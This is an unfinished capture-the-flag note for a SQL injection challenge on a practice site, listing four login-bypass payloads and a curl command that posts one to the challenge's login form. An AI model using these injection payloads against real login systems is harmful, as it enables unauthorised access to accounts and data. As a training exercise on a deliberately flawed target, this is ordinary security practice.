# 5. SQL — admin login, CEO memo — OPEN

**Site:** https://sql.cyberzerk.fr
**Status:** No flag found yet. Payloads listed, still need a live run.

## The challenge

The lead developer coded the authentication system at 4:00 AM after three consecutive sleepless nights. Log in as an administrator to retrieve the CEO's confidential internal memo and prove the system is flawed.

## What is known

- The login form POSTs `username` + `password` to `/`.
- A developer note on the page: "TODO: Ajouter la verification CSRF et le hash des mots de passe. Note: pousse en prod a 04:12 AM."
- Admin-zone CSS is present in the page source (`.admin-header`, `.dump-box`, `.flag`) — after an admin login the CEO memo and the flag should be shown.

## Payloads to try, in order (any password, e.g. `x`)

1. `admin'--` (with a trailing space — comments out the password check)
2. `admin' OR '1'='1'--`
3. `' OR '1'='1'--`
4. `admin' OR 1=1--`

First try:

```bash
curl -s -c cj.txt -b cj.txt -d "username=admin'--&password=x" https://sql.cyberzerk.fr/
```

Then grep the response for `CyberZerk{`, the memo, or the `.flag` div.

## Why it is still open

The POST to sql.cyberzerk.fr was blocked during preparation — that was a preparation block, not a payload failure. The payloads above have not been run live yet. Run them on your own machine and paste back the output.
